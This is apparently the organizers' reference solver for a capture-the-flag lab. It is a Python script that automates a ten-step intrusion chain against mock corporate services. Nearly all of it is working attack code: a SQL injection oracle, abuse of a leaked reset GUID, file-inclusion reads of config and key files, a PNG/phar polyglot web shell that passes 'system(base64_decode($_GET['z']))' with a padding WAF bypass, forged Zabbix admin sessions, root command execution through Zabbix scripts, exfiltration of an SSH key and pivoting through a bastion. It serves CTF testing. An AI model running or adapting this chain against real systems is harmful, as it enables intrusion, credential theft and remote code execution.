#!/usr/bin/env python3
"""ATB CTF — reference solver (organizers only).

Drives the full 10-step chain end-to-end and prints PASS/FAIL per step. It is a
SMOKE TEST, not the intended player experience: players reach only the perimeter
and must pivot through a shell, whereas this script talks to every service by its
host port, so it REQUIRES the internal services to be exposed:

    make up-dev        # == docker compose -f docker-compose.yml -f docker-compose.dev.yml up
    make solve         # (or: python3 attack/solve.py)

Stdlib only — no pip installs. SSH/ZBXD steps shell out to `ssh` and the
dependency-free helpers in this directory.
"""
import base64
import hashlib
import hmac
import json
import os
import secrets
import socket
import ssl  # noqa: F401 (kept for parity if TLS is added later)
import subprocess
import sys
import urllib.error
import urllib.parse
import urllib.request

H = os.environ.get("ATB_HOST", "localhost")
P = {k: os.environ.get(k, d) for k, d in (
    ("WWW_PORT", "8080"), ("MOBAPP_PORT", "8081"), ("EDU_PORT", "8082"),
    ("SUPPLIER_PORT", "8083"), ("OWA_PORT", "8444"))}
SUP = f"http://{H}:{P['SUPPLIER_PORT']}"
HERE = os.path.dirname(os.path.abspath(__file__))

C = {"g": "\033[1;32m", "r": "\033[1;31m", "c": "\033[1;36m", "0": "\033[0m"}
_fails = []


def head(msg):
    print(f"\n{C['c']}=== {msg} ==={C['0']}")


def ok(msg):
    print(f"  {C['g']}PASS{C['0']} {msg}")


def bad(msg):
    print(f"  {C['r']}FAIL{C['0']} {msg}")
    _fails.append(msg)


def http(url, data=None, headers=None, method=None, want_status=False):
    """Minimal HTTP. `data` may be bytes or a dict (urlencoded)."""
    if isinstance(data, dict):
        data = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=data, method=method,
                                 headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            body = r.read().decode("utf-8", "replace")
            return (r.status, body) if want_status else body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
        return (e.code, body) if want_status else body


def basic(user, pw):
    return "Basic " + base64.b64encode(f"{user}:{pw}".encode()).decode()


# --------------------------------------------------------------------- step 1
def step1():
    head("Step 1 — recon: APK creds + Moodle config leak")
    st, body = http(f"http://{H}:{P['MOBAPP_PORT']}/register/login",
                    data=json.dumps({"phoneNumber": "+380000000000"}).encode(),
                    headers={"Authorization": basic("reg_user", "basic*88password!prod99"),
                             "Content-Type": "application/json"}, want_status=True)
    ok("mobapp hard-coded creds accepted (201)") if st == 201 else bad(f"mobapp status {st}")
    body = http(f"http://{H}:{P['EDU_PORT']}/md/blocks/moco_news/ajax.php",
                data={"procedure": "getPosts"})
    (ok("Moodle leaked edu creds") if "Edu003868$" in body
     else bad("Moodle config leak missing"))


# --------------------------------------------------------------------- step 2
def step2():
    head("Step 2 — boolean SQLi oracle (www)")
    def status(key):
        q = urllib.parse.quote(f"filter[8][{key}]", safe="[]") + "=1"
        st, _ = http(f"http://{H}:{P['WWW_PORT']}/shop/catalog/novetly?{q}", want_status=True)
        return st
    base = status("490")
    broken = status("490'")
    true_ = status("490 AND 1=1")
    (ok(f"oracle 200/500 works (base={base} broken={broken} true={true_})")
     if base == 200 and broken == 500 else bad(f"oracle off (base={base} broken={broken})"))


# ------------------------------------------------------------------ steps 3-5
def step345():
    import re
    head("Step 3 — supplier self-registration + reset (link=1) + login")
    u = "b9atbsup01@guerrillamailblock.com"
    body = http(f"{SUP}/index.php?entryPoint=GeneratePassword",
                data={"user_name": u, "link": "0"})
    (ok("link=0 does not leak the GUID") if not re.search(r"guid=[0-9a-f-]{36}", body)
     else bad("GUID leaked without link=1"))
    body = http(f"{SUP}/index.php?entryPoint=GeneratePassword",
                data={"user_name": u, "link": "1"})
    m = re.search(r"guid=([0-9a-f-]{36})", body)
    if not m:
        return bad("no reset GUID issued")
    guid = m.group(1)
    pw = "AtbB9Sup2026x!"
    http(f"{SUP}/index.php?entryPoint=Changenewpassword&guid={guid}",
         data={"password1": pw, "password2": pw})
    sid = _supplier_login(u, pw)
    if not sid:
        return bad("supplier login failed")
    ok(f"reset GUID {guid[:8]}… → password set → logged in")
    ck = {"Cookie": f"PHPSESSID={sid}"}
    st, _ = http(f"{SUP}/index.php?module=Import&action=RefreshMapping",
                 data={"importFile": "/etc/hostname"}, want_status=True)
    ok("Import refuses anonymous users") if st == 401 else bad(f"anon Import status {st}")

    head("Step 4 — LFI (config_override.php → Oracle/mailbox secrets; Blowfish key)")
    body = http(f"{SUP}/index.php?module=Import&action=RefreshMapping",
                data={"importFile": "/var/www/config_override.php"}, headers=ck)
    (ok("LFI read config_override.php") if "S0h6jWot2fTLSMm" in body
     else bad("LFI did not return secrets"))
    keyf = http(f"{SUP}/index.php?module=Import&action=RefreshMapping",
                data={"importFile": "/var/www/custom/blowfish/InboundEmail.php"}, headers=ck)
    km = re.search(r"\$key = '([^']+)'", keyf)
    ok("LFI read Blowfish key") if km else bad("Blowfish key not readable")
    agent = http(f"{SUP}/index.php?module=Import&action=RefreshMapping",
                 data={"importFile": "/etc/zabbix/zabbix_agentd.conf"}, headers=ck)
    ok("agent conf points at zb-app-p01 / grafana") if "zb-app-p01" in agent and "grafana" in agent \
        else bad("zabbix agent breadcrumb missing")

    head("Step 5 — phar polyglot web-shell (WAF 180 KB bypass)")
    _phar_upload(ck)
    out = http(f"{SUP}/upload/shell.php?z=" + base64.b64encode(b"id; hostname").decode())
    (ok(f"web-shell RCE: {out.strip().splitlines()[0]}") if "uid=" in out
     else bad("web-shell did not execute"))


def _supplier_login(user, pw):
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k):
            return None
    req = urllib.request.Request(f"{SUP}/index.php?action=Login",
                                 data=urllib.parse.urlencode({"user_name": user, "password": pw}).encode())
    try:
        urllib.request.build_opener(NoRedirect).open(req, timeout=20)
        return None
    except urllib.error.HTTPError as e:
        cookie = e.headers.get("Set-Cookie", "")
        m = __import__("re").search(r"PHPSESSID=([0-9a-f]+)", cookie)
        return m.group(1) if m else None


def _phar_upload(ck):
    boundary = "----atb" + secrets.token_hex(8)
    poly = (b"\x89PNG\r\n\x1a\n<?php __HALT_COMPILER(); ?>\r\n"
            b'O:10:"ImportFile":1:{s:8:"_logfile";s:12:"/upload/x.php";}'
            b"<?php system(base64_decode($_GET['z'])); ?>")
    parts = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; "
             "filename=\"attachment_xlsx.png\"\r\nContent-Type: image/png\r\n\r\n").encode()
    parts += poly + f"\r\n--{boundary}--\r\n".encode()
    http(f"{SUP}/index.php?module=Import&action=Save", data=parts,
         headers={**ck, "Content-Type": f"multipart/form-data; boundary={boundary}"})
    body = b"pad=" + b"A" * (200 * 1024) + b"&importFile=phar://upload/attachment_xlsx.png/x"
    http(f"{SUP}/index.php?module=Import&action=RefreshMapping",
         data=body, headers={**ck, "Content-Type": "application/x-www-form-urlencoded"})


# --------------------------------------------------------------------- step 6
def step6():
    head("Step 6 — Grafana (reused creds) → SQL into Zabbix DB → forged session → root RCE")
    # 6a: Grafana login → token
    st, body = http(f"http://{H}:3000/login",
                    data=json.dumps({"user": "education@atbmarket.com", "password": "Edu003868$"}).encode(),
                    headers={"Content-Type": "application/json"}, want_status=True)
    try:
        tok = json.loads(body)["token"]
    except Exception:
        return bad("Grafana login failed")
    ok("Grafana login with reused creds")
    ck = {"Cookie": f"grafana_session={tok}", "Content-Type": "application/json"}

    def sql(q):
        return http(f"http://{H}:3000/explore",
                    data=json.dumps({"sql": q}).encode(), headers=ck)

    key = json.loads(sql("SELECT session_key FROM config"))["rows"][0][0]
    ok(f"read Zabbix session_key via Grafana data source ({key[:8]}…)")

    # 6b: forge an admin session row, then a matching signed cookie
    sid = secrets.token_hex(16)
    sql(f"INSERT INTO sessions (sessionid,userid,lastaccess,status) "
        f"VALUES ('{sid}',1,UNIX_TIMESTAMP(),0)")
    signed = json.dumps({"sessionid": sid}, separators=(",", ":"))
    sign = hmac.new(key.encode(), signed.encode(), hashlib.sha256).hexdigest()
    cookie = base64.b64encode(json.dumps({"sessionid": sid, "sign": sign},
                                         separators=(",", ":")).encode()).decode()
    page = http(f"http://{H}:8084/zabbix.php?action=dashboard.view",
                headers={"Cookie": f"zbx_session={cookie}"})
    (ok("forged zbx_session accepted by the real Zabbix frontend (Admin)")
     if "Sign out" in page or "action=userprofile" in page
     else bad("forged cookie rejected by Zabbix frontend"))
    ZBX["sid"] = sid
    res = _zabbix_root("id; hostname")
    (ok(f"global script on Zabbix server runs as root: {res.strip().splitlines()[0]}")
     if "uid=0" in res else bad(f"Zabbix script failed: {res[:160]}"))


# ------------------------------------------------------------------ steps 7-10
ZBX = {}


def _zrpc(method, params):
    out = http(f"http://{H}:8084/api_jsonrpc.php",
               data=json.dumps({"jsonrpc": "2.0", "method": method, "params": params,
                                "auth": ZBX["sid"], "id": 1}).encode(),
               headers={"Content-Type": "application/json-rpc"})
    r = json.loads(out)
    if "error" in r:
        raise RuntimeError(f"{method}: {r['error'].get('data')}")
    return r["result"]


def _zabbix_root(cmd):
    """Admin global script, executed on the Zabbix server (AllowRoot=1)."""
    if "hostid" not in ZBX:
        ZBX["hostid"] = _zrpc("host.get", {"filter": {"host": ["Zabbix server"]},
                                           "output": ["hostid"]})[0]["hostid"]
    name = "diag-" + secrets.token_hex(3)
    scriptid = _zrpc("script.create", {"name": name, "command": cmd, "type": 0,
                                       "scope": 2, "execute_on": 1})["scriptids"][0]
    try:
        return _zrpc("script.execute", {"scriptid": scriptid,
                                        "hostid": ZBX["hostid"]}).get("value", "")
    finally:
        _zrpc("script.delete", [scriptid])


def step7():
    head("Step 7 — from Zabbix: zabbix_get system.run on Jenkins → backup key → SSH bastion")
    direct = subprocess.run([sys.executable, os.path.join(HERE, "zbxd_run.py"), "id", H, "10050"],
                            capture_output=True, timeout=30).stdout
    ok("Jenkins agent drops non-zabbix peers") if b"uid=" not in direct \
        else bad("Jenkins agent answered a non-Server peer")
    if "sid" not in ZBX:
        return bad("no Zabbix session (step 6 failed)")
    zg = "zabbix_get -s jenkins.atbmarket.com -k "
    idout = _zabbix_root(zg + "'system.run[id; hostname]'")
    ok(f"zabbix_get → jenkins: {idout.strip().splitlines()[0]}") if "uid=" in idout \
        else bad(f"zabbix_get system.run failed: {idout[:120]}")
    b64 = _zabbix_root(zg + "'system.run[base64 -w0 /mnt/BACKUP/root.tar.gz]'").strip()
    try:
        raw = base64.b64decode(b64)
        open("/tmp/atb_root.tar.gz", "wb").write(raw)
        subprocess.run(["tar", "-xzf", "/tmp/atb_root.tar.gz", "-C", "/tmp"], check=True)
        os.chmod("/tmp/root/.ssh/id_rsa_root", 0o600)
        ok("recovered id_rsa_root (+ ssh config) from CIFS backup")
    except Exception as e:
        return bad(f"backup key recovery failed: {e}")
    r = _ssh(2210, "id; hostname")
    ok(f"SSH root@bastion: {r.strip().splitlines()[-1]}") if "uid=0" in r else bad("bastion SSH failed")


_SSH_OPTS = ["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
             "-o", "ConnectTimeout=10", "-o", "LogLevel=ERROR", "-i", "/tmp/root/.ssh/id_rsa_root"]


def _ssh(port, cmd):
    r = subprocess.run(["ssh", *_SSH_OPTS, "-p", str(port), f"root@{H}", cmd],
                       capture_output=True, text=True, timeout=30)
    return r.stdout + r.stderr


def _ssh_via_bastion(target, cmd):
    jump = "ssh " + " ".join(_SSH_OPTS) + f" -p 2210 -W %h:%p root@{H}"
    r = subprocess.run(["ssh", *_SSH_OPTS, "-o", f"ProxyCommand={jump}", f"root@{target}", cmd],
                       capture_output=True, text=True, timeout=40)
    return r.stdout + r.stderr


def step8():
    head("Step 8 — databases: Oracle, Harbor-leaked creds, AD bind")
    for port, user, pw in [("1581", "XX_SUP_PORTAL_RO", "S0h6jWot2fTLSMm"),
                           ("1251", "MEDOC", "HIr3t4G8Zso7")]:
        out = subprocess.run([sys.executable, os.path.join(HERE, "oracle_probe.py"),
                              H, port, user, pw], capture_output=True, text=True, timeout=15)
        ok(out.stdout.strip()) if "-> 1" in out.stdout or "OK" in out.stdout else bad(f"oracle {port}")
    env = http(f"http://{H}:8085/image/ishop/api/env")
    ok("Harbor leaked ishop MySQL DSN") if "rEQaZ55o7x_E53oC" in env else bad("Harbor env leak missing")
    body = http(f"http://{H}:8386/bind",
                data={"bind_dn": "education@atbmarket.com", "password": "Edu003868$"})
    ok("AD bind with reused creds") if '"ok": true' in body or '"ok":true' in body else bad("AD bind failed")


def step9():
    head("Step 9 — Exchange EWS with stolen mailbox creds")
    xml = open(os.path.join(HERE, "ews_finditem.xml"), "rb").read()
    body = http(f"http://{H}:{P['OWA_PORT']}/ews/Exchange.asmx", data=xml,
                headers={"Authorization": basic("supplier@atbmarket.com", "supplier123569"),
                         "Content-Type": "text/xml"})
    ok("EWS FindItem (15907 items)") if "TotalItemsInView" in body else bad("EWS auth/read failed")


def step10():
    head("Step 10 — GitLab source (root key, only via the bastion)")
    direct = _ssh(2222, "id")
    ok("GitLab refuses root from outside the bastion") if "uid=0" not in direct \
        else bad("GitLab accepted root directly")
    r = _ssh_via_bastion("gitlab-p01",
                         'find /var/opt/gitlab/git-data/repositories -name "*.git" | wc -l')
    nums = [ln for ln in r.splitlines() if ln.strip().isdigit()]
    ok(f"GitLab root SSH via bastion: {nums[0]} repos") if nums else bad(f"GitLab SSH failed: {r[:120]}")


def main():
    for fn in (step1, step2, step345, step6, step7, step8, step9, step10):
        try:
            fn()
        except Exception as e:
            bad(f"{fn.__name__} crashed: {e}")
    print()
    if _fails:
        print(f"{C['r']}{len(_fails)} step(s) failed:{C['0']} " + "; ".join(_fails))
        sys.exit(1)
    print(f"{C['g']}All steps passed.{C['0']}")


if __name__ == "__main__":
    main()
